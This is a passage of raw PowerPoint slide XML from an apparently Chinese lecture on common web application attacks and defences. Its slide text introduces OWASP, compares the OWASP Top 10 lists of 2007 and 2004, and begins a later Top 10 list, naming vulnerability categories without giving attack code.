          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6600"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="zh-CN"/>
            </a:defPPr>
            <a:lvl1pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>常见</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用攻击及防范</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777676" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>内容提纲</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777679" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1279192" y="3448105"/>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80" name="Text Box 16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1356156" y="3468742"/>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2</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24" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1242678" y="5134070"/>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25" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="5157837"/>
            <a:ext cx="5685413" cy="579437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用防火墙</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>WAF</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3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 Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1346628" y="5165820"/>
            <a:ext cx="301686" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1522078" y="5673819"/>
            <a:ext cx="6268026" cy="46037"/>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Tree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:push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a:xfrm>
            <a:off x="648494" y="3038475"/>
            <a:ext cx="7793037" cy="702253"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>十大安全漏洞变迁史</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452611" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="508289" y="1532659"/>
            <a:ext cx="7790583" cy="4798868"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP: Open Web Application Security Project</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>， </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.owasp.org</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>一个全志愿者组成的、非营利性机构</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>开发和出版免费专业开源的文档、工具和标准，如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Ten Most Critical Web Application Security Vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>《A Guide to Building Secure Web Applications》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WebGoat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>WebScarab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，各种</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代码测试工具等</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" alt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2611">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="452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2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2611">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="452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2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2611">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="452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26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en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452611" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="508289" y="1532659"/>
            <a:ext cx="7790583" cy="4410075"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP: Open Web Application Security Project</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>， </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.owasp.org, http://www.owasp.org.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>致力于帮助组织机构理解和提高他们的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>组织各种</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全会议</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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2611">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4526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26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2611">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4526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26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2611">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4526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26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a:xfrm>
            <a:off x="1102014" y="339436"/>
            <a:ext cx="6407150" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2007 VS. 2004</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1/2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="499752" name="Group 40"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="1017588"/>
          <a:ext cx="8229600" cy="5508309"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4114800"/>
                <a:gridCol w="4114800"/>
              </a:tblGrid>
              <a:tr h="720725">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8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rPr>
                        <a:t>OWASP Top 10 2007</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="2800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="bg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OWASP Top 10 2004</a:t>
                      </a:r>
                      <a:endPar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r>
              <a:tr h="57626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A1. Cross Site Scripting (XSS)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A4. Cross Site Scripting (XSS)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3238">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A2. Injection Flaws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A6. Injection Flaws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816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A3. Malicious File Execution</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(NEW)</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501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A4. Insecure Direct Object Reference</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A2. Broken Access Control </a:t>
                      </a:r>
                      <a:b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b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(Split in 2007 T10)</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66738">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A5. Cross Site Request Forgery (CSRF)</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(NEW)</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501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A6. Information Leakage and Improper Error Handling</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A7. Improper Error Handling</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501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A7. Broken Authentication and Session Management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A3. Broken Authentication and Session Management</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="20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a:xfrm>
            <a:off x="1268268" y="339436"/>
            <a:ext cx="6407150" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2007 VS. 2004 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2/2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="501805" name="Group 45"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="323850" y="1039813"/>
          <a:ext cx="8569325" cy="5198429"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3960813"/>
                <a:gridCol w="4608512"/>
              </a:tblGrid>
              <a:tr h="717550">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OWASP Top 10 2007</a:t>
                      </a:r>
                      <a:endPar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rPr>
                        <a:t>OWASP Top 10 2004</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="2800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                        <a:solidFill>
                          <a:schemeClr val="bg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99"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="48736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A8. Insecure Cryptographic Storage</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A8. Insecure Storage</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9438">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A9. Insecure Communications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(NEW)</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311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A10. Failure to Restrict URL Access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A2. Broken Access Control (split in 2007 T10)</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5938">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&lt;removed in 2007&gt;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A1. Un-validated Input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&lt;removed in 2007&gt;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A5. Buffer Overflows</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3238">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&lt;removed in 2007&gt;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A9. Denial of Service</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73113">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&lt;removed in 2007&gt;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1014730" rtl="0" eaLnBrk="1" fontAlgn="base" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPct val="20000"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPct val="10000"/>
                        </a:spcAft>
                        <a:buClr>
                          <a:srgbClr val="FF0000"/>
                        </a:buClr>
                        <a:buSzTx/>
                        <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <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A10. Insecure Configuration Management</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="20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p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>十大安全漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-OWASP 2007</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="444420" name="Picture 4" descr="Top_10_2007-MitreDataChart"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="1920875"/>
            <a:ext cx="9144000" cy="4676775"/>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82613" y="1239838"/>
            <a:ext cx="7772400" cy="5065712"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A1. Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：注入漏洞；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A2. Broken Authentication and Session Management</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：失效的身份认证和会话管理；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A3. Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：跨站脚本；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>A4. Insecure Direct Object References</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>：不安全的直接对象引用；</a:t>
